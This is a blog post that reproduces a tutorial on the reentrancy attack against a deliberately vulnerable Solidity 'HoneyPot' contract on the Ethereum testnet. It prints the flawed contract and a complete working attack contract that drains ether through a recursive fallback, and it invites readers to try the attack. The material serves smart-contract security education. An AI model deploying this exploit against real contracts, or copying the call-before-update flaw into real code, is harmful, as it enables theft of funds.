---
layout: 	coco
title: 		"理解 可重入"
date: 		2018-08-01 12:00:00
author: 	"shamphone"
chapter:	"1"
status:		"hidden"

---
参考 https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4

To code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not only your money but also other people’s as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are being defined and redefined by the day so one need to be always updated and akin to smart contract security best practices.

As a student of smart contract security, I have been on the look out for vulnerabilities in code. Recently the educators at Team B9lab informed me of this contract deployed to the testnet.

pragma solidity ^0.4.8;
contract HoneyPot {
  mapping (address => uint) public balances;
  function HoneyPot() payable {
    put();
  }
  function put() payable {
    balances[msg.sender] = msg.value;
  }
  function get() {
    if (!msg.sender.call.value(balances[msg.sender])()) {
      throw;
    }
      balances[msg.sender] = 0;
  }
  function() {
    throw;
  }
}
The HoneyPot contract above originally contained 5 ether and was deliberately devised to be hacked. In this blog post I want to share with you how I attacked this contract and ‘collected’ most of its ether.

The Vulnerable Contract

The purpose of the HoneyPot contract above is to keep a record of balances for each address that put() ether in it and allow these addresses to get() them later.

Let’s look at the most interesting parts of this contract:

mapping (address => uint) public balances;
The code above maps addresses to a value and store it in a public variable called balances . It allows to check the HoneyPot balance for a address.

balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]
The put() function below is where the storage of the ether value happens in the contract. Note that msg.sender here is the address from the sender of the transaction.

function put() payable {
    balances[msg.sender] = msg.value;
  }
This next function we find where the exploitable is. The purpose of this function is to let addresses to withdraw the value of ether they have in the HoneyPot balances.

function get() {
    if (!msg.sender.call.value(balances[msg.sender])()) {
      throw;
    }
      balances[msg.sender] = 0;
  }
Where is the exploitable and how can someone attack this you ask? Check again these lines of code out:

if (!msg.sender.call.value(balances[msg.sender])()) {
      throw;
}
balances[msg.sender] = 0;
HoneyPot contract sets the value of the address balance to zero only after checking if sending ether to msg.sender goes through.

What if there is an AttackContract that tricks HoneyPot into thinking that it still has ether to withdraw before AttackContract balance is set to zero. This can be done in a recursive manner and the name for this is called reentrancy attack.

Let’s create one.

Here is the full contract code. I will attempt my best to explain its parts.

pragma solidity ^0.4.8;
import "./HoneyPot.sol";
contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
  }
  function kill () {
    suicide(msg.sender);
  }
  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}
The first few lines is basically assigning the solidity compiler to use with the contract. Then we import the HoneyPot contract which I put in a separate file. Note that HoneyPot is referenced throughout the HoneyPotCollect contract. And we set up the contract base which we call it HoneyPotCollect .

pragma solidity ^0.4.8;
import "./HoneyPot.sol";
contract HoneyPotCollect {
  HoneyPot public honeypot;
...
}
Then we define the constructor function. This is the function that is called when HoneyPotCollect is created. Note that we pass an address to this function. This address will be the HoneyPot contract address.

function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
}
Next function is a kill function. I want to withdraw ether from the HoneyPot contract to the HoneyPotCollect contract. However I want also to get the collected ether to an address I own. So I add a mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address that calls the kill function.

function kill () {
  suicide(msg.sender);
}
The following function is the one that will set the reentrancy attack in motion. It puts some ether in HoneyPot and right after it gets it.

function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
The payable term here tells the Ethereum Virtual Machine that it permits to receive ether. Invoke this function with also some ether.

The last function is what is known as the fallback function. This unnamed function is called whenever the HoneyPotCollect contract receives ether.

function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
This is where the reentrancy attack occur. Let’s see how.

The Attack

After deploying HoneyPotCollect, call collect() and sending with it some ether.

HoneyPot get() function sends ether to the address that called it only if this contract has any ether as balance. When HoneyPot sends ether to HoneyPotCollect the fallback function is triggered. If the HoneyPot balance is more than the value that it was sent to, the fallback function calls get() function once again and the cycle repeats.

Recall that within the get()function the code that sets the balance to zero comes only after sending the transaction. This tricks the HoneyPot contract into sending money to the HoneyPotCollect address over and over and over until HoneyPot is depleted of almost all its ether.

Try it yourself. I left 1 test ether in this contract so others could try it themselves. If you see no ether left there, then it is because someone already attacked it before you.

I originally created this code for the HoneyPotAttackusing the Truffle framework. Here is the code in case you need it for reference. Enjoy!